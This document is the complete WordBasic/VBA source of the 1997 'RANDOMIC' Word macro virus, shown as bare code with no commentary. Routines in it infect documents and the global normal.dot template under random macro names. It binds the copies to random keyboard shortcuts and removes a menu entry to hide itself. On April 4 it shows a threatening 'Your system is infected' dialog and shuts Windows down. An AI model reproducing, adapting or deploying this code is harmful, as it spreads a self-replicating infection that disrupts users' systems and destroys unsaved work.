   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "J158"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "RANDOMIC+j"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.J158.MAIN"
   Dim a$
   Dim b$
   Dim w$
   Dim Q$
   Dim Qw$
   Dim Key$
   On Error GoTo -1: On Error GoTo Finish
   a$ = WordBasic.[FileName$](): If a$ = "" Then GoTo Finish
   b$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If b$ = "normal.dot" Then
       If VInstDoc = 0 Then
           VInfectDoc
           WordBasic.FileSaveAll 1, 1
       End If
           w$ = Noini$(b$): Q$ = WordBasic.[MacroDesc$](w$)
           Qw$ = WordBasic.[Right$](Q$, 1): WordBasic.Insert Qw$
   Else
       Key$ = WordBasic.[GetDocumentVar$]("TKey"): WordBasic.Insert Key$
       If VInstNormal = 0 Then
           VInfectNormal
       End If
   End If
   Finish:
   Randomic
   End Sub

   Private Sub VInfectDoc()
   Dim CO$
   Dim b$
   Dim gf$
   Dim lo$
   Dim li$
   Dim gd$
   Dim ge$
   Dim gh
   Dim go$
   Dim v
   Dim S$
   Dim u$
   CO$ = Noini$(b$): gf$ = GetNewTas$(lo$, li$): gd$ = WordBasic.[Left$](gf$, 1)
   ge$ = WordBasic.[Right$](gf$, 2): gh = WordBasic.Val(ge$): go$ = WordBasic.[MacroDesc$](CO$)
   WordBasic.ToolsMacro Name:=CO$, Description:="RANDOMIC+" + gd$, SetDesc:=1
   v = 1: S$ = Fun$(u$): WordBasic.FileSaveAs Format:=v
   WordBasic.MacroCopy "Global:" + CO$, WordBasic.[FileName$]() + ":" + S$
   WordBasic.ToolsMacro Name:=CO$, Description:=go$, SetDesc:=1
   WordBasic.SetDocumentVar "RANDOMIC", S$
   WordBasic.SetDocumentVar "TKey", gd$
   WordBasic.ToolsCustomizeKeyboard KeyCode:=gh, Category:=2, Name:=S$, Add:=1, Context:=1
   End Sub

   Private Sub VInfectNormal()
   Dim z$
   Dim u$
   Dim PO$
   Dim CO$
   Dim gf$
   Dim lo$
   Dim li$
   Dim gd$
   Dim ge$
   Dim gh
   Dim a$
   Dim l$
   z$ = Fun$(u$): PO$ = WordBasic.[GetDocumentVar$]("RANDOMIC")
   CO$ = WordBasic.[FileName$]() + ":" + PO$: WordBasic.MacroCopy CO$, "Global:" + z$
   gf$ = GetNewTas$(lo$, li$): gd$ = WordBasic.[Left$](gf$, 1)
   ge$ = WordBasic.[Right$](gf$, 2): gh = WordBasic.Val(ge$)
   WordBasic.ToolsCustomizeKeyboard KeyCode:=gh, Category:=2, Name:=z$, Add:=1, Context:=0: a$ = "RANDOMIC+" + gd$
   WordBasic.ToolsMacro Name:=z$, Show:=1, Description:=a$, SetDesc:=1: l$ = WordBasic.[MenuText$](0, 6, 0)
   WordBasic.ToolsCustomizeMenuBar Context:=0, MenuType:=0, Menu:=l$, Remove:=1
   End Sub

   Private Function VInstNormal()
   Dim RA$
   Dim b$
   Dim i
   RA$ = Noini$(b$)
       VInstNormal = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
           If WordBasic.[MacroName$](i, 0) = RA$ Then
               VInstNormal = 1
           End If
       Next i
   End If
   End Function

   Private Function VInstDoc()
   Dim IC$
   Dim i
   On Error Resume Next
   IC$ = WordBasic.[GetDocumentVar$]("RANDOMIC")
       VInstDoc = 0
       If WordBasic.CountMacros(1) > 0 Then
           For i = 1 To WordBasic.CountMacros(1)
               If WordBasic.[MacroName$](i, 1) = IC$ Then
                   VInstDoc = 1
               End If
           Next i
       End If
   End Function

   Private Function Fun$(u$)
   Dim a
   Dim b$
   Dim c$
   Dim di
   Dim dj$
   Dim d$
   Dim x
   Dim y
   Dim z
   Dim e$
   Dim f
   Dim g$
   Dim h$
   Dim i
   Dim j$
   a = Rnd(): b$ = Str(a): c$ = WordBasic.[Right$](b$, 2): di = Rnd()
   dj$ = Str(di): d$ = WordBasic.[Right$](dj$, 2): x = WordBasic.Val(d$)
   y = WordBasic.Val(c$): z = x * y: e$ = Str(z): e$ = WordBasic.[LTrim$](e$)
   f = Rnd(): g$ = Str(f): h$ = WordBasic.[Right$](g$, 1): h$ = WordBasic.[RTrim$](h$)
   i = WordBasic.Val(h$)
   If i = 0 Then
       j$ = "A"
   ElseIf i = 1 Then
       j$ = "B"
   ElseIf i = 2 Then
       j$ = "C"
   ElseIf i = 3 Then
       j$ = "D"
   ElseIf i = 4 Then
       j$ = "E"
   ElseIf i = 5 Then
       j$ = "F"
   ElseIf i = 6 Then
       j$ = "G"
   ElseIf i = 7 Then
       j$ = "H"
   ElseIf i = 8 Then
       j$ = "I"
   ElseIf i = 9 Then
       j$ = "J"
   End If
   u$ = j$ + e$: Fun$ = u$
   End Function

   Private Function Noini$(b$)
   Dim c
   Dim d$
   c = 1
   Again:
   On Error GoTo -1: On Error GoTo venito: b$ = WordBasic.[KeyMacro$](c, 0)
   d$ = WordBasic.[MacroDesc$](b$): d$ = WordBasic.[Left$](d$, 8)
   If d$ = "RANDOMIC" Then
       Noini$ = b$
   Else
       c = c + 1: GoTo Again
   End If
   venito:
   End Function

   Private Function GetNewTas$(lo$, li$)
   Dim KI
   Dim KJ$
   Dim KK$
   Dim K
   NewRandom:
   KI = Rnd(): KJ$ = Str(KI): KK$ = WordBasic.[Right$](KJ$, 2): KK$ = WordBasic.[LTrim$](KK$)
   K = WordBasic.Val(KK$): If K < 65 Or K > 90 Then GoTo NewRandom
   If K = 65 Then
       lo$ = "a"
   ElseIf K = 66 Then
       lo$ = "b"
   ElseIf K = 67 Then
       lo$ = "c"
   ElseIf K = 68 Then
       lo$ = "d"
   ElseIf K = 69 Then
       lo$ = "e"
   ElseIf K = 70 Then
       lo$ = "f"
   ElseIf K = 71 Then
       lo$ = "g"
   ElseIf K = 72 Then
       lo$ = "h"
   ElseIf K = 73 Then
       lo$ = "i"
   ElseIf K = 74 Then
       lo$ = "j"
   ElseIf K = 75 Then
       lo$ = "k"
   ElseIf K = 76 Then
       lo$ = "l"
   ElseIf K = 77 Then
       lo$ = "m"
   ElseIf K = 78 Then
       lo$ = "n"
   ElseIf K = 79 Then
       lo$ = "o"
   ElseIf K = 80 Then
       lo$ = "p"
   ElseIf K = 81 Then
       lo$ = "q"
   ElseIf K = 82 Then
       lo$ = "r"
   ElseIf K = 83 Then
       lo$ = "s"
   ElseIf K = 84 Then
       lo$ = "t"
   ElseIf K = 85 Then
       lo$ = "u"
   ElseIf K = 86 Then
       lo$ = "v"
   ElseIf K = 87 Then
       lo$ = "w"
   ElseIf K = 88 Then
       lo$ = "x"
   ElseIf K = 89 Then
       lo$ = "y"
   ElseIf K = 90 Then
       lo$ = "z"
   End If
   li$ = Str(K): GetNewTas$ = lo$ + li$
   End Function

   Private Sub Randomic()
   Dim dlg As Object
   Dim d
   If WordBasic.Month(WordBasic.Now()) = 4 And WordBasic.Day(WordBasic.Now()) = 4 Then
   WordBasic.BeginDialog 532, 238, ">> RANDOMIC <<          STRANGE LUCK         >> RANDOMIC <<"
   WordBasic.Text 44, 8, 431, 13, "______________________________________________", "Text1"
   WordBasic.Text 44, 91, 431, 13, "______________________________________________", "Text5"
   WordBasic.Text 44, 132, 431, 13, "______________________________________________", "Text7"
   WordBasic.Text 164, 29, 181, 13, "Your system is infected ", "Text2"
   WordBasic.Text 80, 75, 361, 13, "Immediately stop your work, or you will regret it.", "Text3"
   WordBasic.Text 127, 52, 252, 13, "with the RANDOMIC macro virus.", "Text4"
   WordBasic.Text 122, 114, 248, 13, "That's maybe your last chance!!!", "Text6"
   WordBasic.Text 157, 157, 184, 13, "Nightmare Joker [SLAM]", "Text8"
   WordBasic.Text 227, 184, 39, 13, "1997", "Text9"
   WordBasic.OKButton 203, 208, 88, 21
   WordBasic.EndDialog
   Set dlg = WordBasic.CurValues.UserDialog
   d = WordBasic.Dialog.UserDialog(dlg)
   WordBasic.ExitWindows
   End If
   End Sub
